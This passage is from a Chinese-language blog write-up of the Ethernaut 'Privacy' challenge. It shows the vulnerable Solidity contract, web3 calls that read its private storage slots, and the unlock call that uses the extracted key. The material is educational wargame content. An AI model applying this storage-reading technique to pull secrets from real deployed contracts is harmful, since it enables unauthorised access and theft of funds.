+<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><h3 id="闯关要求-11"><a href="#闯关要求-11" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这个合约的制作者非常小心的保护了敏感区域的 storage.</p>
+<p>解开这个合约来完成这一关.</p>
+<h3 id="合约代码-11"><a href="#合约代码-11" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(now);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) public &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-11"><a href="#合约分析-11" class="headerlink" title="合约分析"></a>合约分析</h3><p>升级版vault，用 <code>getStorageAt()</code> 把链上的数据读出来</p>
+<h3 id="攻击流程-11"><a href="#攻击流程-11" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>根据优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits（32字节），它们就会存储在同一个插槽里</p>
+<p>通过查询得到</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224214603113.png" srcset="/img/loading.gif" lazyload alt="image-20220224214603113"></p>
+<p>可以分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.eth.getStorageAt(contract.address,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000000000001  </span><br><span class="hljs-comment">//locked = true 1字节 01</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000062178997  </span><br><span class="hljs-comment">//ID = block.timestamp 常量</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">2</span>)<br><span class="hljs-comment">//0x000000000000000000000000000000000000000000000000000000008997ff0a </span><br><span class="hljs-comment">// flattening = 10 1字节 0a</span><br><span class="hljs-comment">//denomination = 255 1字节 ff</span><br><span class="hljs-comment">//awkwardness = uint16(now) 2字节</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">3</span>)<br><span class="hljs-comment">//0xf29eea5d3875c68825a80d9c459dec52f5bbd55dd5ce827e00ec92ae60f7ddb2  </span><br><span class="hljs-comment">//data[0]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">4</span>)<br><span class="hljs-comment">//0x153a7c6b4bf25f3a526a687713411c5ca83ae18c6f8950ff0f09be93bd36cb95  </span><br><span class="hljs-comment">//data[1]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">5</span>)<br><span class="hljs-comment">//0x0b444a369c67e1d2436e5410d7c891644b6f088cb5f3451cc11f5ae67c451e18  </span><br><span class="hljs-comment">//data[2]</span><br><br></code></pre></td></tr></table></figure>
+
+<p>所以解锁需要的data[2]应该是0x0b444a369c67e1d2436e5410d7c89164</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">contract.unlock(<span class="hljs-string">&#x27;0x0b444a369c67e1d2436e5410d7c89164&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>检查解锁成功</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220625238.png" srcset="/img/loading.gif" lazyload alt="image-20220224220625238"></p>
+<p>提交实例</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220653313-16459470826481.png" srcset="/img/loading.gif" lazyload alt="image-20220224220653313"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/">#靶场刷题</a>
+      
+        <a href="/tags/Etherum/">#Etherum</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ethernaut闯关（上）</div>
+      <div>http://example.com/2022/02/27/Ethernaut闯关（上）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 27, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/" title="Ethernaut闯关（下）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Ethernaut闯关（下）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/" title="智能合约错误随机性">
+                        <span class="hidden-mobile">智能合约错误随机性</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
